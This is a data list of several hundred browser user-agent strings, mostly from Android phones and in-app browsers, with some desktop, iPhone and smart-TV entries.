"Mozilla/5.0 (Linux; Android 9; SM-A307FN Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 Instagram 298.0.0.31.110 Android (28/9; 280dpi; 720x1423; samsung; SM-A307FN; a30s; exynos7885; it_IT; 510206687)",
"Mozilla/5.0 (Linux; Android 11; Pixel 4 XL) AppleWebKit/537.43 (KHTML, like Gecko) Chrome/112.0.5615.101 Mobile Safari/537.46",
"Mozilla/5.0 (Linux; Android 12; M2007J3SG Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; arm_64; Android 12; CPH2471) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 YaBrowser/23.7.0.271.00 SA/3 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 13; CPH2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.135 Mobile Safari/537.36 OPR/75.2.3978.72990",
"Mozilla/5.0 (Linux; Android 8.0.0; PRA-LX1 Build/HUAWEIPRA-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022148526",
"Mozilla/5.0 (Linux; Android 10; ZTE A2020G Pro Build/QKQ1.191014.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022148526",
"Mozilla/5.0 (Linux; Android 11; SM-A505G Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 11; SM-A226B Build/RP1A.200720.012) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022148526",
"Mozilla/5.0 (Linux; Android 9; JAT-L29 Build/HONORJAT-L29) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022150848",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 LikeWise/93.6.7475.76",
"Mozilla/5.0 (Linux; Android 10; M2006C3LG Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.4951.61 Mobile Safari/537.36 GNews Android/2022131834",
"Mozilla/5.0 (Linux; Android 6.0.1; SM-T555 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Safari/537.36 GNews Android/2022150848",
"Opera/9.80 (Linux armv7l; HbbTV/1.2.1 (; Hisense; SmartTV_2015; V00.01.00a.H0121; HE65K5500UWTS; )) Presto/2.12.407 Version/12.51 year/2016",
"Mozilla/5.0 (Linux; Android 13; 2203129G Build/TKQ1.220807.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022148544",
"Mozilla/5.0 (Linux; Android 9; moto e(6) plus Build/PTAS29.401-58-8; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 13; CPH2529 Build/RKQ1.211119.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/370.0.0.16.116;]",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.69 maglev/23231.413.2355.7555/49",
"Mozilla/5.0 (Linux; Android 11; RMX1993) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/22.0 Chrome/111.0.5563.116 Mobile Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 LikeWise/95.6.5765.66",
"Mozilla/5.0 (Linux; Android 12; SM-G973F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; 10; HRY-LX1T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; arm_64; Android 11; M2102J20SI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5545.103 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; U; Android 12; ru-ru; RMX3627 Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.88 Mobile Safari/537.36 HeyTapBrowser/45.9.5.8.2",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 AtContent/99.5.9254.55",
"Mozilla/5.0 (Linux; arm; Android 13; RMX3521) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 YaApp_Android/23.70.1 YaSearchBrowser/23.70.1 BroPP/1.0 SA/3 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 11; Mi 10 Pro) AppleWebKit/537.43 (KHTML, like Gecko) Chrome/116.0.5845.163 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; arm_64; Android 12; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5325.106 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; SM-J701MT Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 12; SM-A032F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/nl_NL;FBAV/370.0.0.16.116;]",
"Mozilla/5.0 (Linux; Android 10; STK-LX1 Build/HUAWEISTK-LX1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 12; M2007J3SY Build/SKQ1.211006.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022148544",
"Mozilla/5.0 (Linux; Android 12; SM-A115M Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 10; Mi 9 Lite Build/QKQ1.190828.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 11; SM-G781B Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 11; CPH1941 Build/RKQ1.200903.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.168 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 10; VOG-L09 Build/HUAWEIVOG-L09; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (iPhone; CPU iPhone OS 16_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 BytedanceWebview/d8a21c6 musical_ly_30.8.0 JsSdk/2.0 NetType/4G Channel/App Store ByteLocale/fr Region/FR",
"Mozilla/5.0 (Linux; Android 6.0; ALE-L21 Build/HuaweiALE-L21) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36 GNews Android/2022148544",
"Mozilla/5.0 (X11; Linux armv7l) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Safari/537.36 HbbTV/1.5.1 (+DRM; Philips; 32PFS6905/05; 202.005.004.001; ; _TV_MT9288_2020;) FVC/4.0 (Philips; com.tpv-tech.TPM207E;) LaTivu_1.0.1_2020",
"Mozilla/5.0 (Linux; Android 13; SM-A525F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.105 Mobile Safari/537.36 Instagram 298.0.0.31.110 Android (33/13; 420dpi; 1080x2186; samsung; SM-A525F; a52q; qcom; it_IT; 510206698)",
"Mozilla/5.0 (Linux; Android 9; SM-J530F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/425.0.0.22.49;]",
"Mozilla/5.0 (Linux; Android 10; BLA-L09 Build/HUAWEIBLA-L09S; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 Instagram 298.0.0.31.110 Android (29/10; 408dpi; 1080x2040; HUAWEI; BLA-L09; HWBLA; kirin970; it_IT; 510206667)",
"Mozilla/5.0 (Linux; Android 13; ANY-NX1 Build/HONORANY-N21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 13; 21061119DG Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022148544",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 OpenWave/93.4.1073.74",
"Mozilla/5.0 (Linux; Android 13; SM-A546B Build/TP1A.220624.014; ) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.0.0 Mobile Safari/537.36 BingSapphire/26.1.410824302",
"Mozilla/5.0 (Linux; arm_64; Android 11; Redmi Note 8T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5765.97 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; arm_64; Android 10; HD1900) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5855.178 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; arm_64; Android 11; Nokia G20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5465.113 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; arm_64; Android 10; EML-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 YaBrowser/23.7.5.97.00 SA/3 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; arm_64; Android 12; CPH2009) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 YaBrowser/23.7.7.54.00 SA/3 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 11; Pixel 6 Pro) AppleWebKit/537.46 (KHTML, like Gecko) Chrome/114.0.5735.227 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 12; M2007J3SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36 OPR/66.2.3445.62346",
"Mozilla/5.0 (Linux; Android 12; 22071219CG Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.130 Mobile Safari/537.36 GNews Android/2022137898",
"Mozilla/5.0 (Linux; Android 12; Pixel 4 XL) AppleWebKit/537.46 (KHTML, like Gecko) Chrome/114.0.5735.196 Mobile Safari/537.44",
"Mozilla/5.0 (Linux; arm_64; Android 12; SM-G781B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 YaBrowser/23.7.4.94.00 SA/3 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 11; Pixel 6) AppleWebKit/537.43 (KHTML, like Gecko) Chrome/114.0.5735.227 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 13; CPH2305 Build/SKQ1.221119.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 13; SM-A127F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.168 Mobile Safari/537.36 GNews Android/2022148526",
"Mozilla/5.0 (Linux; Android 8.1.0; DRA-L21 Build/HUAWEIDRA-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 9; FIG-LX1; HMSCore 6.11.4.311; GMSCore 23.32.17) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 HuaweiBrowser/13.0.5.303 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 13; SM-N770F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36 GNews Android/2022148526",
"Mozilla/5.0 (Linux; Android 12; RMX2075 Build/RKQ1.211103.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 Instagram 298.0.0.31.110 Android (31/12; 480dpi; 1080x2245; realme; RMX2075; RMX2075L1; qcom; zh_CN; 510206698)",
"Mozilla/5.0 (Linux; Android 13; SM-S134DL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36 EdgA/109.0.1518.53",
"Mozilla/5.0 (Linux; Android 11; SM-A405FN Build/RP1A.200720.012) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.4951.61 Mobile Safari/537.36 GNews Android/2022071088",
"Mozilla/5.0 (Linux; Android 8.0.0; ASUS_X00PD Build/OPR1.170623.032; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 11; Redmi Note 9S Build/RKQ1.200826.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022148544",
"Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Safari/605.1.15 GNews iOS/5.56.1200",
"Mozilla/5.0 (Linux; Android 13; 23049PCD8G Build/TKQ1.221114.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022148526",
"Mozilla/5.0 (Linux; Android 10; SM-A202F Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 GNews Android/2022005154",
"Mozilla/5.0 (Linux; Android 10; SM-A307FN Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022137898",
"Mozilla/5.0 (Linux; Android 11; CPH1907 Build/RKQ1.200903.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; Nokia 7.1 Build/QKQ1.190828.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022148526",
"Mozilla/5.0 (Linux; Android 10; JSN-L21 Build/HONORJSN-L21) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022150848",
"Mozilla/5.0 (Linux; Android 13; SM-A226B Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; INE-LX1; HMSCore 6.11.0.331; GMSCore 23.33.16) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 HuaweiBrowser/13.0.5.303 Mobile Safari/537.36",
"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/21A5326a [FBAN/FBIOS;FBDV/iPhone14,3;FBMD/iPhone;FBSN/iOS;FBSV/17.0;FBSS/3;FBID/phone;FBLC/nl_NL;FBOP/5]",
"Mozilla/5.0 (Windows NT 5.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2643.95 Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; SM-J610FN Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; arm_64; Android 12; Redmi Note 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5745.183 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; arm_64; Android 11; RMX1921) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 YaApp_Android/23.70.1 YaSearchBrowser/23.70.1 BroPP/1.0 SA/3 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 12; Galaxy S10+) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.227 Mobile Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.69 Unique/100.7.9816.17",
"Mozilla/5.0 (Linux; Android 13; moto e13 Build/TLA33.105-42-42) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 12; moto e22i Build/SOW32.121-40) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.135 Mobile Safari/537.36 GNews Android/2022108570",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 OpenWave/94.4.5903.4",
"Mozilla/5.0 (Linux; Android 12; CPH2195 Build/SKQ1.210216.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 13; 220333QNY Build/TKQ1.221114.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.136 Mobile Safari/537.36 GNews Android/2022140634",
"Mozilla/5.0 (Linux; Android 11; moto e40 Build/ROQS31.166-87-9) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022148526",
"Mozilla/5.0 (Linux; Android 12; FNE-AN00 Build/HONORFNE-AN00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36 T7/13.38 SP-engine/2.76.0 baiduboxapp/13.38.5.10 (Baidu; P1 12) NABar/1.0 dumedia/7.43.11.16",
"Mozilla/5.0 (Linux; Android 7.0; SM-J530F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.62 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 11; motorola edge Build/RPDS31.Q4U-39-26-14-10-1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 13; CPH2271 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]",
"Mozilla/5.0 (Linux; Android 13; 21091116UG Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 Instagram 298.0.0.31.110 Android (33/13; 440dpi; 1080x2190; Xiaomi/Redmi; 21091116UG; pissarropro; mt6877; pt_BR; 510206479)",
"Mozilla/5.0 (Linux; Android 13; CPH2449 Build/TP1A.220905.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022148544",
"Mozilla/5.0 (Linux; Android 12; CPH2269 Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.76 Mobile Safari/537.36 GNews Android/2022131834",
"Mozilla/5.0 (Linux; Android 10; CPH1931 Build/QKQ1.200209.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 GNews Android/2022148526",
"Mozilla/5.0 (Linux; Android 13; M1908C3JGG Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 13; 2201116TG Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 12; 22111317G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; RMX1911 Build/QKQ1.200209.002) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; SM-G950F Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.131 Mobile Safari/537.36 GNews Android/2022148526",
"Mozilla/5.0 (Linux; Android 12; SM-A528B Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022148526",
"Mozilla/5.0 (Linux; Android 11; CPH1951 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; moto e(7) power Build/QOLS30.288-52-23) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 13; SM-A336B Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 GNews Android/2022148538",
"Mozilla/5.0 (Linux; Android 12; SM-G996B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 13; SM-A736B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 Instagram 298.0.0.31.110 Android (33/13; 450dpi; 1080x2167; samsung; SM-A736B; a73xq; qcom; pt_BR; 510206667)",
"Mozilla/5.0 (Linux; Android 10; C21 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 12; SM-A236B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 11; SM-A105FN Build/RP1A.200720.012) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 GNews Android/2022148526",
"Mozilla/5.0 (Linux; Android 11; X96 Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/429.0.0.27.114;]",
"Mozilla/5.0 (Linux; Android 13; SM-M336B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/429.0.0.27.114;]",
"Mozilla/5.0 (Linux; Android 12; T767H Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 13; 22101316G Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/429.0.0.27.114;]",
"Mozilla/5.0 (Linux; Android 7.1.1; SM-T550 Build/NMF26X) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Safari/537.36 GNews Android/2022148526",
"Mozilla/5.0 (Linux; Android 12; SM-M215F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; arm_64; Android 12; 220333QNY) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 YaBrowser/23.3.1.88.00 SA/3 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 12; Pixel 3a) AppleWebKit/537.43 (KHTML, like Gecko) Chrome/112.0.5615.100 Mobile Safari/537.43",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2862.81 Safari/537.36",
"Mozilla/5.0 (Linux; U; Android 11; ru-ru; Redmi Note 8 Pro Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.136 Mobile Safari/537.36 XiaoMi/MiuiBrowser/13.36.1-gn",
"Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2817.6 Safari/537.36",
"Mozilla/5.0 (Linux; arm_64; Android 13; SM-S9180) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 YaBrowser/23.7.7.54.00 SA/3 Mobile Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2726.57 Safari/537.36",
"Mozilla/5.0 (Linux; arm_64; Android 11; vivo 1907) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 YaSearchBrowser/23.55.1 BroPP/1.0 YaSearchApp/23.55.1 webOmni SA/3 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 8.0.0; SAMSUNG SM-G935F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/114.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 13; Redmi Note 7 Build/TQ3A.230705.001.B4; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/429.0.0.27.114;]",
"Mozilla/5.0 (Linux; Android 13; SM-A236B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/429.0.0.27.114;]",
"Mozilla/5.0 (Linux; Android 9; AFTKA Build/PMAIN1.19565D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.170 Mobile Safari/537.36 cordova-amazon-fireos/3.4.0 AmazonWebAppPlatform/3.4.0;2.0",
"Mozilla/5.0 (Linux; Android 11; Lenovo TB-X306F Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 10; H8416 Build/52.1.A.0.532; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.135 Mobile Safari/537.36",
